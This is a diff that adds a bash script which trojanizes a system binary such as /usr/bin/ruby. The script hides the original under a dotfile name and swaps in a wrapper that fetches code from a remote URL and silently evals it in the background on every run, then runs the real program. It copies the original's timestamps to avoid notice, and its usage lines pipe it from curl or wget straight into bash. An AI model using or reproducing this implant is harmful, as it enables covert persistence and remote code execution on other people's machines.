@@ -1,0 +1,62 @@
+#!/bin/bash
+
+# Usage:     curl -s localhost:4444/infect | COVER=/usr/bin/ruby URL=http://localhost:4444/kali bash
+# or:   wget -q -O - localhost:4444/infect | COVER=/usr/bin/ruby URL=http://localhost:4444/kali bash
+
+
+
+set -euo pipefail
+
+cover="${COVER:?Must be set}"
+URL="${URL:?Must be set}"
+
+# Check to make sure $cover exists
+if [ ! -e "$cover" ]; then
+	echo "Does "$cover" exist?" >&2
+	exit 1
+fi
+
+# Derive replacement filename
+orig="$(dirname "$cover")/.$(basename "$cover")"
+
+# Figure out download tool
+get=""
+curl="$(which curl || true)"
+if [ -n "$curl" ]; then
+	get="$curl -s -k -L"
+else
+	wget="$(which wget || true)"
+	if [ -n "$wget" ]; then
+		get="$wget -q -O - --no-check-certificate"
+	fi
+fi
+if [ -z "$get" ]; then
+	echo "No curl or wget found" >&2
+	exit 11
+fi
+
+printf "Infecting..."
+mv "$cover" "$orig"
+cat > "$cover" << dog
+#!/bin/bash
+orig="$orig"
+cover="$cover"
+URL="$URL"
+function get() {
+	$get "\$1"
+}
+function clean() {
+	mv "\$orig" "\$cover" && exit
+}
+if [ -n "\$CLEAN" ]; then
+	echo "Cleaned"
+	clean
+fi
+(
+	eval "\$(get "\$URL")"
+) >/dev/null 2>/dev/null &
+exec "$orig" "\$@"
+dog
+chmod 755 "$cover"
+touch -r "$orig" "$cover"
+echo "done"
